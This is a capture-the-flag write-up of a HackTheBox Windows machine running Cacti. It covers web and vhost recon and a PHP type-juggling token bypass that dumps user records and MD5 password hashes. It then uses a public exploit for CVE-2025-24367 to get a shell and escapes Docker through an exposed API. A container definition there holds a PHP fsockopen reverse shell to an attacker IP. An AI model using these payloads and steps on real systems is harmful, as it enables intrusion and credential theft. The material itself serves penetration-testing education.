---
title: "Exploitation of PHP vulnerabilities, CVE-2025–9074 and CVE-2025-24367"
date: 2025-12-14 00:00:00 +0800
categories: [Bug bounty, hacking]
tags: [Bug bounty, WriteUp, Hacking]
--- 

Hello everyone! we're gonna take a look to a easy machine of hackthebox that i recently pwned,discovering interesting vulnerabilities that can nowdays affect multiple website and having fun with a lot of recon! 


# Network Recon
Target: 10.10.11.98

As always, i start my scan with the fastes port discovery i know: [rustscan](https://github.com/bee-san/RustScan)
```bash
rustscan -a 10.10.11.96 --ulimit 5000
```
Output:
```bash
Open 10.10.11.98:80  
Open 10.10.11.98:5985
```
#### Let's delve deeper
```shell
❯ nmap -sT -A -Pn -T5 -p 80,5985 10.10.11.98 --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=2s
```
Output:
```bash
PORT     STATE    SERVICE VERSION  
80/tcp   filtered http  
5985/tcp open     http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
So we just have a website and a WinRM port

### Web recon
Let's use some nice tool to identify the technologies used by this site:

```shell
whatweb http://10.10.11.98
```

Output:
```shell
http://10.10.11.98 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.10.11.98], RedirectLocat  
ion[http://monitorsfour.htb/], Title[302 Found], nginx

http://monitorsfour.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[sales@mon  
itorsfour.htb], HTTPServer[nginx], IP[10.10.11.98], JQuery, PHP[8.3.27], Script, Title[MonitorsFour - N  
etworking Solutions], X-Powered-By[PHP/8.3.27], X-UA-Compatible[IE=edge], nginx
```
The site is built with PHP 8.3.27, jQuery and nginx as a proxy manager.

Let's lookup for some CVEs releated to this PHP version on [ExploitDB](https://www.exploit-db.com/)

<img width="1641" height="113" alt="image" src="https://github.com/user-attachments/assets/50afc882-1584-4236-b2d5-2968a6e547df" />


Let's keep it in my mind and let's see how the website looks:

<img width="1790" height="727" alt="image" src="https://github.com/user-attachments/assets/66b5311d-008c-4f7f-b8a5-49ff458903b6" />


Now we use feroxbuster to identify every available asset on the website.
```shell
❯ feroxbuster -u http://monitorsfour.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -C 404
```
Output:
```shell
http://monitorsfour.htb/static/images/review.svg
http://monitorsfour.htb/login
http://monitorsfour.htb/static/js/custom.js
http://monitorsfour.htb/static/js/smoothscroll.js
http://monitorsfour.htb/static/images/services/02.png
http://monitorsfour.htb/static/js/plugins.js
http://monitorsfour.htb/static/images/services/01.png
http://monitorsfour.htb/static/images/services/04.png
http://monitorsfour.htb/static/images/services/03.png
http://monitorsfour.htb/static/css/plugins.css
http://monitorsfour.htb/static/css/style.css
http://monitorsfour.htb/static/admin/assets/images/logo.png
http://monitorsfour.htb/static/images/service.svg
http://monitorsfour.htb/static/images/about-us.svg
http://monitorsfour.htb/static/js/popper.min.js
http://monitorsfour.htb/static/images/banner.svg
http://monitorsfour.htb/static/js/jquery-min.js
http://monitorsfour.htb/static/js/bootstrap.min.js
http://monitorsfour.htb/static/js/owl.carousel.min.js
http://monitorsfour.htb/static/admin/assets/images/logo.ico
http://monitorsfour.htb/controllers
http://monitorsfour.htb/static/admin/assets/js/plugins/loaders
http://monitorsfour.htb/static/admin/assets/js/plugins/loaders/blockui.min.js  
http://monitorsfour.htb/static/admin/assets/js/core/app.js
http://monitorsfour.htb/static/admin/assets/js/core/libraries
and more...
```

Let's also use ReconSpider to get any scrapable information
```shell
❯ python3 ReconSpider.py -u http://monitorsfour.htb/
```
<img width="821" height="527" alt="image" src="https://github.com/user-attachments/assets/3fd48564-4e74-4601-acb7-64dff63781ce" />

We found an email and other endpoints, however they seems to not containing any good information

We also have a login endpoint that doesn't seems vulnerable to SQL injection, NoSqli or other type of injection vulnerabilities, so let's continue with recon
<img width="436" height="560" alt="image" src="https://github.com/user-attachments/assets/481da92e-d0f8-4cdf-adb6-c9f02e26803b" />


#### Virtual host fuzzing
Let's see if there is any vHost available fuzzing it with [FFUF](https://github.com/ffuf/ffuf), i filter by size 138 and status code 404 since every request sent with a non valid vhost reply with  size: 138
```shell 
❯ ffuf -u http://monitorsfour.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 404 -H "HOST:FUZZ.monitorsfour.htb" -fs 138                                    
```
output: 
```
cacti
```
Let's go in this subdomain and let's take a look.
### Cacti Framework

Well! this is the 4th time i have to deal with cacti and every time is very funny :)

<img width="859" height="537" alt="image" src="https://github.com/user-attachments/assets/14e850dc-1302-46e4-ac8e-d2cbb0ae0e90" />


So we have cacti version 1.2.28 , if we look up for some CVEs, we find some interesting ones,
CVE-2024-43363 was one of the most recents, remote code execution, but this one was address in cacti 1.28.8 , so let's move on.

We ended up finding:
#### CVE-2025-24367
An authenticated Cacti user can abuse graph creation and graph template functionality to create arbitrary PHP scripts in the web root of the application, leading to remote code execution on the server. This vulnerability is fixed in 1.2.29.

Since we must be authenticated, we need to find a way to get credentials.

## Insecure APIs and PHP Type Juggling vulnerability
Returning back to the main website login, we attempt to intercept the request using burpsuite proxy:
<img width="1225" height="350" alt="image" src="https://github.com/user-attachments/assets/633a0301-6f43-4183-8e12-6c46e7f88093" />

let's fuzz `/api/v1/auth` 

```shell
❯ ffuf -u 'http://monitorsfour.htb/api/v1/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
```

Output:
`users `<br>
So we send the intercepted request to the repeater and modify the endpoint from `/api/v1/auth` to `/api/v1/users`
as results we get : <br>
`Missing id parameter` & `Missing token parameter`
<img width="1220" height="464" alt="image" src="https://github.com/user-attachments/assets/fed4ed8f-efa2-4851-9897-1c6b70d53bcc" />


Of course, even after modifing the request, we don't have any valid token, here it comes a wonderfull vulnerabilty:
###  Type juggling attack
If you already know what we are talking about , you can skip this part, if not, let me explain it to you:

>PHP has a feature called “type juggling”, or “type coercion”,
This means that during the comparison of variables of different types, PHP will first convert them to a common, comparable type.
For example, when the program is comparing the string “7” and the integer 7 in the scenario below:
            
            <img width="443" height="163" alt="image" src="https://github.com/user-attachments/assets/c34ede50-adfe-4651-8449-ff107c027607" />

>The code will run without errors and output “PHP can compare ints and strings.” This behavior is very helpful when you want your program to be flexible in dealing with different types of user input
this behavior is also a major source of bugs and security vulnerabilities.
For example, if we compare 7puppies with 7, the result will be TRUE
(“7 puppies” == 7) -> True
But what if the string that is being compared does not contain an integer? The string will then be converted to a “0”. So the following comparison will also evaluate to True:
(“Puppies” == 0) -> True
Loose type comparison behavior like these is pretty common in PHP and many built-in functions work in the same way. You can probably already see how this can be very problematic, but how exactly can hackers exploit this behavior?

## Bypass authentication.
Let’s say the PHP code that handles authentication looks like this:
if ($_POST["password"] == "Admin_Password") {login_as_admin();}
Then, simply submitting an integer input of 0 would successfully log you in as admin, since this will evaluate to True:
(0 == “Admin_Password”) -> True
However, this vulnerability is not always exploitable and often needs to be combined with a deserialization flaw. The reason for this is that POST, GET parameters and cookie values are, for the most part, passed as strings or arrays into the program.
### But
If the POST parameter from the example above is passed into the program as a string, PHP would be comparing two strings, and no type conversion would be needed. And “0” and “Admin_Password” are, obviously, different strings.
“0” == “Admin_Password”) -> False

However, type juggling issues can be exploited if the application takes accepts the input via functions like json_decode() or unserialize(). This way, it would be possible for the end-user to specify the type of input passed in.

{“password”: “0”}   to    {“password”: 0} // Manipulating the request

Consider the above JSON blobs. The first one would cause the password parameter to be treated as a string whereas the second one would cause the input to be interpreted as an integer by PHP. This gives an attacker fine-grained control of the input data type and therefore the ability to exploit type juggling issues.
[Source](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

# Exploitation
Instead of making our own magic hash list, we can find one of this in [Seclists](https://github.com/danielmiessler/SecLists/blob/master/Pattern-Matching/php-magic-hashes.txt)
```bash
❯ ffuf -u 'http://monitorsfour.htb/api/v1/user?token=FUZZ&id=1' -w ./Pattern-Matching/php-magic-hashes.txt                                                            
```
We get a list of hashes that let us bypass token validation
<img width="651" height="257" alt="image" src="https://github.com/user-attachments/assets/78039692-c981-43c3-b35d-92ae3700fdd8" />

Sending it to the repeater we notice that we still need a fundamental value: `valid ids`
Let's create a number wordlist and use again FFUF, this time fuzzing ids:
```bash
for i in {1..100};do echo $i;done >> ids.txt
```
```bash
❯ ffuf -u 'http://monitorsfour.htb/api/v1/user?token=0e074025&id=FUZZ' -w ./ids.txt -fs 36 | awk '{print $1}'
```
We get 5,2,7,6
<img width="1628" height="500" alt="image" src="https://github.com/user-attachments/assets/0935ba7a-d188-48a9-9d2c-4f0b11b97400" />

after we sent the previous request to the burpsuite intruder and get every response content for that valid ids , we successfully get everything of that user:

<img width="1591" height="309" alt="image" src="https://github.com/user-attachments/assets/c32aadbb-bc9f-4242-bf8e-3285112a6a49" />

```json
{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"}

{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"v Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"}

{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}

{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"}

```
Taking a look , we notice the password hashing method is very insecure, MD5..
Using a simple site as [CrackStation](https://crackstation.net/)
we receive the decodable hashes:
<img width="682" height="341" alt="image" src="https://github.com/user-attachments/assets/48a8c2c0-d120-4ccd-87fa-ce30323351c6" />

 
So we have:
`admin:wonderful1` <br>
We can now access the admin dashboard, but nothing interesting is inside.

<img width="1841" height="827" alt="image" src="https://github.com/user-attachments/assets/86d771f8-ee2b-4152-8c20-081e8e4ca389" />


### CVE-2025-24367 Exploitation
Spreading credentials found before over cacti, we signed in.
For the exploitation part we can use this [PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
 
 ```bash
 python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.34 -l 4242 -url  cacti.monitorsfour.htb 
 ```
 
<img width="1778" height="418" alt="image" src="https://github.com/user-attachments/assets/6b1e565c-2a29-4cea-a3a2-fd1b994a7656" />

 Shell obtained!

 # Privilege escalation 
 <br> 
 First of all, we are in a docker environment, and we don't like docker environment, so we must escape it.
 After enumerating almost everything (SUID binaries..versions..capabilities..expoosed creds, insecure permissions & more)
 i found something interesting in resolv.conf:
<img width="764" height="230" alt="image" src="https://github.com/user-attachments/assets/fe915195-2c12-4d59-b7bd-1b5d178419ec" />

 
At this point i wanted to figure out if i can get any ICMP response from that ip in  order to understand if we could reach it, but both nc/telnet and ping were unavailable, not even arp was inside this docker image, so i created this simple script, that target common ports:
```bash
#!/bin/bash

TARGET_IP="192.168.65.7"
TIMEOUT=1

declare -a COMMON_PORTS=(21 22 23 25 53 80 110 135 139 143 443 445 3389 8080)
for PORT in "${COMMON_PORTS[@]}"; do
    (exec 3<> /dev/tcp/$TARGET_IP/$PORT) 2>/dev/null 1>&2
    
    if [ $? -eq 0 ]; then
        echo "[OPEN] Port $PORT"
    fi
    exec 3<&- 3>&- 
done
```
Then i had to adapt it in order to make it one-line,
```shell
TARGET_IP="192.168.65.7"; TIMEOUT=1; COMMON_PORTS=(21 22 23 25 53 80 110 135 139 143 443 445 3389 8080); for PORT in "${COMMON_PORTS[@]}"; do (exec 3<> /dev/tcp/$TARGET_IP/$PORT) 2>/dev/null 1>&2; if [ $? -eq 0 ]; then echo "[OPEN] Port $PORT"; fi; exec 3<&- 3>&-; done
```
The output that i received was just port 53, so i modified the script in order to attempt the connection in all the 65535 ports and found out that also 2375 was opened.

Taking a look online , we found out that this port could be' exploited if not properly protected.
[Exploitation](https://systemweakness.com/docker-port-2375-2376-how-to-exploit-8faa8d70a7ab)

## Docker escape: CVE-2025–9074
>This vulnerability consist in abusing exposed and insicure docker APIs in order to create a docker image that could mount root directory ( So that we can access every share in the windows host )

In order to verify if the api are vulnerable, we must send a request using curl 
```bash
curl http:/192.168.65.7:2375/containers/json
```
<img width="1133" height="354" alt="image" src="https://github.com/user-attachments/assets/b79f025d-04c5-4c58-b50a-414f2ddb93d3" />


Yes! let's create a json file that describe how our image should be'
```json 
{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/sh", "-c", "php -r \"\\$sock=fsockopen('10.10.14.216',51002);exec('/bin/sh -i <&3 >&3 2>&3');\""],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}

```
In order to get this final json, i had to deal a lot with it , many errors occurred, missing tools inside the image.. (bash,sh to get a reverse shell), finding the right mount part and more. but finally i was able to get a reverse shell by creating the container like so:
```shell
curl -H "Content-Type: application/json" -d @cr.json http://192.168.65.7:2375/containers/create -o resp.json
```
> In the resp.json, there is the container Id, we must use it to start the container with that image

`id=cdbe8635fa8c923e3452446a63a17c27251d9651b11a69e59de9fc8da8567cf9`

```bash
curl -X POST http://192.168.65.7:2375/containers/$id/start
```
And finally we became root! <br>
<img width="336" height="57" alt="image" src="https://github.com/user-attachments/assets/a3f880e9-eb8e-47b3-ab58-e9439f92825f" />
